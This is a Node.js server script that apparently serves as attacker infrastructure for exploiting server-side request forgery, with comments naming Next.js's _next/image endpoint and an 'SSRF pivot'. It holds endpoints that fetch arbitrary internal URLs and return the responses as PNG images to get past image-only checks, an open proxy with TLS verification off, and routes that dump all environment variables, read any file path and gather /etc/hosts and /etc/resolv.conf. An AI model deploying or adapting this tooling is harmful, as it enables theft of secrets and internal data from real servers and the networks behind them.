const http = require('http');
const https = require('https');
const fs = require('fs');
const PORT = process.env.PORT || 10000;
let sharp;
try { sharp = require('sharp'); } catch(e) { console.log('sharp not available'); }

async function fetchUrl(targetUrl) {
  return new Promise((resolve, reject) => {
    const mod = targetUrl.startsWith('https') ? https : http;
    const req = mod.get(targetUrl, { timeout: 8000, rejectUnauthorized: false }, (res) => {
      let data = Buffer.alloc(0);
      res.on('data', chunk => data = Buffer.concat([data, chunk]));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data.toString('utf-8') }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  
  if (url.pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end('{"status":"ok"}');
  }

  // PNG with text — accepted by _next/image!
  if (url.pathname === '/png') {
    const text = url.searchParams.get('text') || 'no data';
    if (!sharp) {
      res.writeHead(500); return res.end('sharp not installed');
    }
    try {
      const lines = text.match(/.{1,100}/g) || [text];
      const svgText = lines.map((l, i) =>
        `<text x="5" y="${16+i*14}" font-family="monospace" font-size="11" fill="black">${l.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</text>`
      ).join('');
      const h = Math.max(50, 20 + lines.length * 14);
      const svg = `<svg width="900" height="${h}" xmlns="http://www.w3.org/2000/svg"><rect width="900" height="${h}" fill="white"/>${svgText}</svg>`;
      const png = await sharp(Buffer.from(svg)).png().toBuffer();
      res.writeHead(200, { 'Content-Type': 'image/png', 'Content-Length': png.length });
      return res.end(png);
    } catch(e) {
      res.writeHead(500); return res.end(e.message);
    }
  }

  // Fetch internal URL, render response as PNG
  if (url.pathname === '/imgfetch') {
    const target = url.searchParams.get('url');
    if (!target) { res.writeHead(400); return res.end('need url'); }
    if (!sharp) { res.writeHead(500); return res.end('sharp not installed'); }
    try {
      const r = await fetchUrl(target);
      const body = `Status:${r.status} URL:${target}\n${r.body}`.substring(0, 5000);
      const lines = body.match(/.{1,100}/g) || [body];
      const svgText = lines.map((l, i) =>
        `<text x="3" y="${14+i*13}" font-family="monospace" font-size="10" fill="black">${l.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</text>`
      ).join('');
      const h = Math.max(50, 20 + lines.length * 13);
      const svg = `<svg width="1000" height="${h}" xmlns="http://www.w3.org/2000/svg"><rect width="1000" height="${h}" fill="white"/>${svgText}</svg>`;
      const png = await sharp(Buffer.from(svg)).png().toBuffer();
      res.writeHead(200, { 'Content-Type': 'image/png' });
      return res.end(png);
    } catch(e) {
      res.writeHead(500); return res.end(e.message);
    }
  }

  if (url.pathname === '/fetch') {
    const target = url.searchParams.get('url');
    if (!target) { res.writeHead(400); return res.end('need url'); }
    try {
      const r = await fetchUrl(target);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(r));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: e.message }));
    }
  }

  if (url.pathname === '/env') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(process.env));
  }

  if (url.pathname === '/file') {
    const path = url.searchParams.get('path');
    try { res.end(fs.readFileSync(path, 'utf-8')); } catch(e) { res.writeHead(500); res.end(e.message); }
    return;
  }

  if (url.pathname === '/recon') {
    const data = {};
    try { data.hosts = fs.readFileSync('/etc/hosts','utf-8'); } catch(e) {}
    try { data.resolv = fs.readFileSync('/etc/resolv.conf','utf-8'); } catch(e) {}
    data.env = process.env;
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(data));
  }


  if (url.pathname === '/whoami') {
    const info = {
      remoteAddress: req.socket.remoteAddress,
      xForwardedFor: req.headers['x-forwarded-for'],
      xRealIp: req.headers['x-real-ip'],
      host: req.headers.host,
      headers: req.headers
    };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(info));
  }

  res.writeHead(404); res.end('not found');
});

server.listen(PORT, () => console.log(`Proxy on :${PORT}`));

// Additional: log requester IP for SSRF pivot
const origHandler = server.listeners('request')[0];
